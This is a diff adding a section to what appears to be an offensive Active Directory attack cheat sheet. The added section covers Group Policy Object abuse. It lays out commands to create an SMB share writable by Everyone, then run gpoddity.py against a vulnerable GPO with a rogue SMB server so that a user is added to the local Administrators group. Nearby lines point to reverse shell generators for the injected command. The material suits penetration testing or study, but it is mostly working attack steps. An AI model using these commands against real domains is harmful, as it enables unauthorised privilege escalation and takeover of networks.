@@ -828,6 +828,36 @@ payload search `reverse shell generator` -> PowerShell #3 (Base64)
 gpupdate /force
 ```
 
+If privious methods is not workking i recommend to create an SMB share with FullAccess to All users 
+
+```bash
+mkdir /path/to/folder_which_sharing
+```
+
+```bash
+net share C:\path\to\folder_to_share=C:\path\to\name_of_share /grant:Everyone,Full
+```
+
+```bash
+icacls "C:\AD\Tools\stdX-gp" /grant Everyone:F /T
+```
+
+This will create a share with FullControl permission 
+
+Then we modify a vulnerable GPO by `gpoddity.py` 
+
+```bash
+python3 gpoddity.py --domain domain --gpo-id 'vulnerable_gpo_id' --username user --password pass --dc-ip ip --command 'net localgroup Administrators user /add'  --rogue-smbserver-ip ip_where_hosted_created_share --rogue-smbserver-share created_share --smb-mode none
+```
+
+Also is important to copy a `GPT_out' folder to share
+
+```bash
+cp -r /path/to/GPOddity/GPT_Out/* /path/to/shared_folder
+```
+
+
+
 [[atributes]]
 == Attributes Change
 
@@ -851,6 +881,7 @@ Options:
 `-gpo-id` taken from bloodhound in Node field
 
 `-command` it's a reverse shell frome this https://www.revshells.com/[site]
+
 
 
 
